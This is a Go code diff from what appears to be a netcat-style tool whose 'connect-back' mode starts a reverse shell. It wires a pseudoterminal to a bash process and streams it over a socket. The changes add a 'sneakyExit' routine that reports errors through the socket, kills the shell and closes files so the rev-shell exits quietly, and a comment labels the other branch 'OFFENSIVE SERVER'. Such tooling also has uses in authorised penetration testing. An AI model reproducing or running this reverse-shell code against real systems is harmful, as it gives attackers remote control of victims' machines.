@@ -18,6 +18,14 @@ import (
 )
 
 func Run(c conn.ConnectionGetter) {
+	type closers struct {
+		socketToClose conn.SocketInterface
+		shellToClose  *shell.RealShell
+		filesToClose  []*os.File
+	}
+
+	var closeUs closers
+
 	// Parse flags from user, attach to struct:
 	flagStruct := utils.GetFlags()
 
@@ -41,9 +49,9 @@ func Run(c conn.ConnectionGetter) {
 		socketInterface = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address, thisPeer.Shell)
 	}
 	defer socketInterface.Close()
+	closeUs.socketToClose = socketInterface
 
 	// If shell flag is true, start shell:
-	//	var shellInterface shell.ShellInterface
 	var shellInterface *shell.RealShell
 	var shellErr error
 
@@ -65,20 +73,55 @@ func Run(c conn.ConnectionGetter) {
 	// ................................................. CONNECT-BACK w/ SHELL .................................................
 	// If we are the connect-back peer & the user wants a shell, start the shell here:
 	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
-		// Get pts and ptm device files:
-		master, pts, err := pty.GetPseudoterminalDevices()
-		if err != nil {
-			// Send error through socket, then quit:
-			errString := "Error starting shell: " + err.Error()
-			socketInterface.Write([]byte(errString))
-			socketInterface.Close()
-			os.Exit(1)
+		// First, make a function we can call which send errors into the socket
+		// .... & handles closing files, etc. before quitting (sneaky).
+		sneakyExit := func(err error, closeUs closers) {
+			// We are the rev-shell, let's limit output to stdout/err,
+			// .... so send error through socket, then quit:
+			socketPresent := closeUs.socketToClose != nil
+			shellPresent := closeUs.shellToClose != nil
+			filesPresent := len(closeUs.filesToClose) > 0
+
+			errMsg := err.Error()
+
+			// Send error, then close socket:
+			if socketPresent {
+				// We could maybe send a custom signal to tell the other peer to close immediately...
+				// .... [[instead of it continuing to try to use the socket]]
+				socketInterface.Write([]byte(errMsg))
+				closeUs.socketToClose.Close()
+			}
+
+			// Kill the rev-shell process:
+			if shellPresent {
+				shellInterface.Shell.Process.Release()
+				shellInterface.Shell.Process.Kill()
+			}
+
+			// If there are open files (in the list), close them:
+			if filesPresent {
+				for _, file := range closeUs.filesToClose {
+					fmt.Printf("Closing %v\n", file.Name())
+					file.Close()
+				}
+			}
+
+			// K, now we can quietly die
+			os.Exit(69)
 		}
 
-		defer pts.Close()
+		// Get pts and ptm device files (for pseudoterminal):
+		master, pts, err := pty.GetPseudoterminalDevices()
+		if err != nil {
+			customErr := fmt.Errorf("Error starting shell: %v\n", err)
+			sneakyExit(customErr, closeUs)
+		}
 		defer master.Close()
+		defer pts.Close()
+		closeUs.filesToClose = append(closeUs.filesToClose, master, pts)
 
-		// Hook up slave device to bash process:
+		// Hook up slave/pts device to bash process:
+		// .... (literally just point it to the file descriptors)
 		shellInterface.Shell.Stdin = pts
 		shellInterface.Shell.Stdout = pts
 		shellInterface.Shell.Stderr = pts
@@ -86,16 +129,13 @@ func Run(c conn.ConnectionGetter) {
 		// Start shell:
 		err = shellInterface.StartShell()
 		if err != nil {
-			// Remember to close the device files:
-			pts.Close()
-			master.Close()
-
 			// Write error to socket, close socket, quit:
-			errString := "Error starting shell: " + err.Error()
-			socketInterface.Write([]byte(errString))
-			socketInterface.Close()
-			os.Exit(1)
+			customErr := fmt.Errorf("Error starting shell: %v\n", err)
+			sneakyExit(customErr, closeUs)
 		}
+		defer shellInterface.Shell.Process.Release()
+		defer shellInterface.Shell.Process.Kill()
+		closeUs.shellToClose = shellInterface
 
 		var routineErr error
 		commandPending := true
@@ -121,23 +161,23 @@ func Run(c conn.ConnectionGetter) {
 		}(socketInterface, master)
 
 		for {
+			// If one of the go routine catches an error,
+			// .... then send that error to sneakyExit()
 			if routineErr != nil {
 				// Send error through socket, then quit:
-				// Remember to close the device files:
-				pts.Close()
-				master.Close()
-
-				socketInterface.Write([]byte(routineErr.Error()))
-				socketInterface.Close()
-				os.Exit(1)
+				sneakyExit(routineErr, closeUs)
 			}
 
+			// Otherwise, 3 millisecond timeout:
 			if commandPending {
 				// Timeout:
 				time.Sleep(3 * time.Millisecond)
 			}
 		}
 	} else {
+		// ................................................. OFFENSIVE SERVER .................................................
+		// ... (or connect-back peer w/o shell flag)
+
 		// ................................................. OG STRAT .................................................
 		// ............................ This is for the listener peer;
 		//								We have 4 go routines, one for reading input from the user,
